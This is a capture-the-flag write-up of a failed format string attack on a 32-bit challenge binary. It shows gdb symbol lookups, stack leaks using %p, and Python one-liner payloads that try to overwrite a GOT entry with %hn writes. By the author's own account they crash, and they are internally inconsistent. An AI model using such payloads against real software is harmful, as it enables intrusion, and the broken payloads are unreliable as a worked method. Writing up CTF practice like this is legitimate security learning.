# Personal Letter
binary - 160 points

## Challenge 
Have you ever gotten tired of writing your name in the header of a letter? Well now there's a [program](personal_letter32) ([source](letter.c)) to do it for you! Navigate to `/problems/letter/` on the shell server to try your exploit out!

## Hint
It prints your name right in the letter!


## Failed Solution

#### Format String Attack

References explaining how to perform format string attacks:

- http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
- https://blog.skullsecurity.org/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail
- https://stackoverflow.com/questions/21162273/overwrite-return-address-simple-format-string-exploit
- https://0x00sec.org/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920

#### Return address

	$ gdb ./personal_letter32 
	(gdb) info add printFlag
	Symbol "printFlag" is at 0x804872b in a file compiled without debugging.
	(gdb) break printFlag
	Breakpoint 1 at 0x8048731

Little endian: `\x2b\x87\x04\x08`
Little endian: `\x31\x87\x04\x08`

#### Find input buffer offset in stack

	# echo 'ABCD %21$p %22$p %23$p %24$p %25$p %26$p %27$p %28$p %29$p %30$p' |./personal_letter32 
	Welcome to the personal letter program!
	Give us your name, and we will generate a letter just for you!
	Enter Name (100 Chars max): 
	________________________________________
	|                                      |
	|                                      |
	|  Dear ABCD (nil) 0xf77d7110 0xff8f6f44 0xff8f6e3f (nil) 0x44434241 0x31322520 0x25207024 0x70243232 0x33322520,|
	|  __________________________________  |

Control using `%26$p`

#### Overwrite `exit()` with `printFlag()`

Overwrite `exit()` function?

	$ objdump -d ./personal_letter32 

GOT table in Hopper

			 exit@GOT:        // exit
	0804a030         dd         0x0804b028  

	 printf@GOT:        // printf
	0804a010         dd         0x0804b004               
Little endian: `\x0c\xa0\x04\x08`
Little endian: `\x10\xa0\x04\x08`
Little endian: `\x28\xb0\x04\x08`
Little endian: `\xb0\x85\x04\x08`

#### Form payload

Write 2 bytes at a time...

	Higher 2 bytes: 0x0804 (2052)
	Lower 2 bytes:  0x872b (34603)

	Format:
		<address><address+2>%<number>x%<offset>$hn%<other number>x%<offset+1>$hn

Forming the values (failed though)

	Plug in the values:
		\xb0\x85\x04\x08 // low word addr
		\xb2\x85\x04\x08 // high word addr
		%2044x   %27$hn  // 2052 bytes: wrote 8 bytes already, write additional 2044 bytes.
		%32551x  %26$hn  // 34603 bytes: wrote 2052 bytes already, write additional 32551 bytes.
		
	Combine payload:
		\xb0\x85\x04\x08\xb2\x85\x04\x08%2044x%26$hn%32551x%26$hn

	In Python:
		python -c "print '\x30\xa0\x04\x08\x32\xa0\x04\x08' + '%2044x%26\$hn%32551x%26\$hn'"
		python -c "print '\x10\xa0\x04\x08\x12\xa0\x04\x08' + '%2044x%26\$hn%32551x%26\$hn'"

Guess and check
	
	$ python -c "print '\x30\xa0\x04\x08\x32\xa0\x04\x08%2036x%26\$hn'" | strace ./personal_letter32 
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x8040804} ---

	$ python -c "print '\x30\xa0\x04\x08\x32\xa0\x04\x08' + '%2036x%27\$hn' + '%32551x%26\$hn'" | strace ./personal_letter32 
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x8040804} ---


	# echo 'abcd %26$p %24$p ' |./personal_letter32 
	Welcome to the personal letter program!
	Give us your name, and we will generate a letter just for you!
	Enter Name (100 Chars max): 
	________________________________________
	|                                      |
	|                                      |
	|  Dear abcd 0x64636261 0xff9af6cf ,             |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|  __________________________________  |
	|______________________________________|
	Exiting.




## Flag

	??





